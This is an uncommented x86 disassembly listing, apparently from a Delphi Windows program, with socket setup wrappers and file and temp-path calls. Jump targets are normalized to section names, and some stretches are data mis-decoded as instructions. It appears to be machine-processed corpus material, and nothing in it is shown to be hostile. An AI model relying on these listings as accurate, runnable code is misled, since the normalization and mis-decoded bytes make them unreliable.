mov eax esi
mov edx 0x7
call sub_40422c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45736f
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403ed0
retn
sub_45737b
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_457403
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x10
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_403f00
mov ax [ ebp - 0x16 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45740a
lea eax [ ebp - 0x1c ]
call sub_403eac
retn
sub_457414
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov ax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] ax
mov eax esi
call sub_40416c
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_457004
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x12 ] ax
push 0x10
lea eax [ ebp - 0x14 ]
push eax
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_45748c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebp - 0x10 ] cx
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_457004
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xe ] ax
push 0x10
lea eax [ ebp - 0x10 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4574dc
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax edi
call sub_40436c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov dl [ eax ]
mov [ esp ] dl
mov dl [ eax + 0x1 ]
mov [ esp + 0x1 ] dl
mov dl [ eax + 0x2 ]
mov [ esp + 0x2 ] dl
mov al [ eax + 0x3 ]
mov [ esp + 0x3 ] al
mov ecx esi
mov edx esp
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
or edx 0xffffffff
mov eax ebx
call sub_456900
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_457538
push ebx
push esi
push edi
push ecx
mov edi ecx
mov ebx edx
mov esi eax
mov eax ebx
call sub_40436c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esp ] eax
push 0x2
push 0x4
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
test ebx ebx
jne r-xdata
mov eax edi
mov edx [ ebx ]
call sub_4040a4
or edx 0xffffffff
mov eax esi
call sub_456900
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_457588
push ebx
mov ebx edx
mov eax ebx
mov edx 0xfa
call sub_4044f8
mov eax [ ebx ]
call sub_40416c
push eax
mov eax [ ebx ]
call sub_40436c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebx ]
call sub_40436c
mov edx eax
mov eax ebx
call sub_4040a4
pop ebx
retn
sub_4575d0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x8
sub_4575ec
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_457677
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x10
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp + 0xc ]
call sub_403f00
mov ax [ ebp - 0x16 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45767e
lea eax [ ebp - 0x1c ]
call sub_403eac
retn
sub_457688
push ebx
push esi
push edi
mov ebx edx
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx [ eax ]
call [ edx + 0x8 ]
mov edx [ ebx ]
mov eax edi
call sub_413a1c
mov esi [ ebx ]
dec esi
test esi esi
jl r-xdata
inc esi
lea eax [ ebx + 0x4 ]
mov ebx eax
mov edx [ ebx ]
mov eax edi
call sub_413704
add ebx 0x4
dec esi
jne r-xdata
sub_4576c4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_457759
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457760
lea eax [ ebp - 0xc ]
call sub_403eac
retn
cmp [ edi + 0x8 ] 0x40
jle r-xdata
mov esi [ edi + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
mov eax [ edi + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
inc esi
mov [ ebp - 0x8 ] 0x0
mov ebx [ ebp - 0x4 ]
add ebx 0x4
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_413860
mov [ ebx ] eax
inc [ ebp - 0x8 ]
add ebx 0x4
dec esi
jne r-xdata
sub_457768
push ebp
mov ebp esp
add esp 0xfffffcec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0x10c ]
xor ecx ecx
mov edx 0x104
call sub_402b04
lea eax [ ebp - 0x210 ]
xor ecx ecx
mov edx 0x104
call sub_402b04
lea eax [ ebp - 0x314 ]
xor ecx ecx
mov edx 0x104
call sub_402b04
lea edx [ ebp - 0x10c ]
mov eax esi
call sub_4576c4
lea edx [ ebp - 0x210 ]
mov eax edi
call sub_4576c4
lea edx [ ebp - 0x314 ]
mov eax [ ebp + 0xc ]
call sub_4576c4
cmp ebx 0xfffffffe
jne r-xdata
mov eax ebx
mov ecx 0x3e8
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax ebx
mov ecx 0x3e8
cdq
idiv ecx
imul eax edx 0x3e8
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
push 0x0
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
lea edx [ ebp - 0x10c ]
mov eax esi
call sub_457688
lea edx [ ebp - 0x210 ]
mov eax edi
call sub_457688
lea edx [ ebp - 0x314 ]
mov eax [ ebp + 0xc ]
call sub_457688
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_457880
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x8
sub_45789c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
xor ecx ecx
mov edx 0x10
call sub_402b04
mov [ ebp - 0x10 ] 0x2
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_457004
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xe ] ax
push 0x10
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push edi
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_457908
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0xc
sub_457928
push ebx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0xc ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebx + 0xc ] eax
sub_457988
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
xor eax eax
push ebp
push sub_457a55
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0x4 ]
call sub_40436c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
push ebp
push j_sub_4036a4#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_407db8
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457a5c
lea eax [ ebp - 0x10 ]
call sub_403eac
retn
sub_457a0f
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1fc
call sub_403864
call sub_4038e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457a5c
lea eax [ ebp - 0x10 ]
call sub_403eac
retn
sub_457a7b
inc [ eax ]
add [ eax ] al
add [ esi ] cl
dec ecx
push ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
test esi esi
je r-xdata
arpl [ ebx + 0x57 ] bp
imul ebp [ esi + 0x64 ] 0x9073776f
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
xor eax eax
push ebp
push sub_457b85
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404e3c
xor eax eax
push ebp
push j_sub_403578#3
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
push eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx [ esi ]
call sub_4040a4
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor ebx ebx
lea eax [ ebp - 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ r-xdata ]
call sub_404e78
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457b8c
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403ed0
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404e3c
retn
mov eax [ ebp - 0x8 ]
mov esi [ eax + ebx * 4 ]
test esi esi
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_4040a4
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc ebx
sub_457b4f
mov eax [ ebp - 0x4 ]
call sub_4030f0
call sub_4038e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457b8c
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403ed0
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404e3c
retn
sub_457bb0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_457c4a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x8 ]
call sub_40436c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
mov [ ebp - 0x4 ] eax
xor esi esi
jmp r-xdata
or edx 0xffffffff
mov eax ebx
call sub_456900
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + esi * 4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457c51
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403ed0
retn
lea ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x7c ]
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc esi
sub_457c58
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov ecx esi
xor edx edx
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_457c74
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40435c
xor eax eax
push ebp
push sub_457d2a
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
push 0x8000080
push 0x3
push 0x0
push 0x1
push 0x80000000
mov eax [ ebp - 0x4 ]
call sub_40436c
push eax
call CreateFileA
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_457d0d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457d14
mov eax [ ebp - 0xc ]
push eax
call CloseHandle
retn
push 0x0
mov eax [ ebp - 0xc ]
push eax
call GetFileSize
mov [ ebp - 0x8 ] eax
sub_457d3c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_40435c
xor eax eax
push ebp
push sub_457dff
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_458560
mov eax [ ebp - 0x8 ]
call sub_407db8
mov [ ebx ] al
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_458560
mov eax [ ebp - 0xc ]
call sub_407db8
mov [ ebx + 0x1 ] al
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_458560
mov eax [ ebp - 0x10 ]
call sub_407db8
mov [ ebx + 0x2 ] al
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_458560
mov eax [ ebp - 0x14 ]
call sub_407db8
mov [ ebx + 0x3 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457e06
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_403ed0
retn
sub_457e24
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_457eb2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_456900
movzx eax [ ebp - 0x14 ]
mov [ edi ] eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0xc ]
call sub_403f00
mov ax [ ebp - 0x12 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457eb9
lea eax [ ebp - 0x18 ]
call sub_403eac
retn
sub_457ec4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_457f52
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_456900
movzx eax [ ebp - 0x14 ]
mov [ edi ] eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0xc ]
call sub_403f00
mov ax [ ebp - 0x12 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457f59
lea eax [ ebp - 0x18 ]
call sub_403eac
retn
sub_457f64
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0xc
sub_457f84
push ebp
mov ebp esp
push 0x0
xor ecx ecx
push ebp
push sub_457fde
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ eax + 0x4 ] 0x40
jl r-xdata
mov ecx [ eax + 0x4 ]
mov [ eax + ecx * 4 + 0x8 ] edx
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457fe5
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
sub_457fec
push ebp
mov ebp esp
push 0x0
push ebx
xor ecx ecx
push ebp
push sub_458046
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
cmp edx [ eax + 0x4 ]
jge r-xdata
mov ebx [ eax + edx * 4 + 0x8 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45804d
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_458054
push ebx
push esi
mov esi [ eax + 0x4 ]
dec esi
test esi esi
jl r-xdata
pop esi
pop ebx
retn
inc esi
xor ecx ecx
inc ecx
dec esi
jne r-xdata
dec [ eax + 0x4 ]
mov edx [ eax + 0x4 ]
mov edx [ eax + edx * 4 + 0x8 ]
mov [ eax + ecx * 4 + 0x8 ] edx
mov edx [ eax + 0x4 ]
xor ebx ebx
mov [ eax + edx * 4 + 0x8 ] ebx
pop esi
pop ebx
retn
cmp edx [ eax + ecx * 4 + 0x8 ]
jne r-xdata
sub_458088
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_458129
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
sub eax 0x2af9
jne r-xdata
mov ecx ebx
mov edx esi
mov eax edi
call sub_456ac4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458130
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ed0
retn
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059ac
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
pop eax
call sub_408940
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_403f00
sub_458138
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_458171
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458178
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sub_4581a8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4581cd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4581d4
retn
sub_45840c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_45846b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx 0x104
call sub_4044f8
mov eax [ ebx ]
call sub_40436c
push eax
mov eax [ ebx ]
call sub_40416c
push eax
call GetTempPathA
mov edx ebx
xchg edx eax
call sub_4044f8
lea edx [ ebp - 0x4 ]
mov eax [ ebx ]
call sub_45830c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458472
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_458478
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_458541
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx r-xdata
call sub_4042b8
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_407994
mov eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax edi
call sub_407994
mov eax [ ebp - 0xc ]
pop edx
call [ rw-data ]
mov esi eax
mov edx [ ebx ]
mov eax edi
call sub_4044b0
mov esi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_4043cc
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
call sub_403f00
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test esi esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458548
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403ed0
retn
push ebx
mov eax edi
call sub_40416c
mov edx eax
add edx esi
mov eax [ ebx ]
mov ecx 0x7fffffff
call sub_4043cc
mov eax ebx
call sub_403eac
jmp r-xdata
sub_458560
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
mov cl [ ebp - 0x1 ]
mov edx esi
call sub_458478
mov eax esi
mov edx r-xdata
call sub_4042b8
jne r-xdata
mov edx [ ebx ]
mov eax esi
call [ rw-data ]
mov edi eax
mov edx [ ebx ]
mov eax esi
call sub_4044b0
mov edi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_4043cc
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
call sub_403f00
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test edi edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
push ebx
mov eax esi
call sub_40416c
mov edx eax
add edx edi
mov eax [ ebx ]
mov ecx 0x7fffffff
call sub_4043cc
jmp r-xdata
mov eax ebx
call sub_403eac
jmp r-xdata
sub_458634
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4586e7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4586ee
retn
mov eax rw-data
call sub_40cb14
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404928
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404928
mov eax rw-data
call sub_403eac
mov eax rw-data
mov edx [ r-xdata ]
call sub_404e3c
mov eax rw-data
mov edx [ r-xdata ]
call sub_404e3c
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404928
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404928
sub_4586f0
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_4587c3
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4587ca
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
lea eax [ ebp - 0x4 ]
call sub_45840c
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_403f00
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov edx r-xdata
mov cl 0x20
call sub_402c28
jne r-xdata
mov eax sub_40be98
mov [ rw-data ] eax
mov [ rw-data ] sub_45862c
jmp r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404e30
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403f00
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404e30
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403f00
sub_458910
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
mov [ ebp ] eax
add [ eax ] al
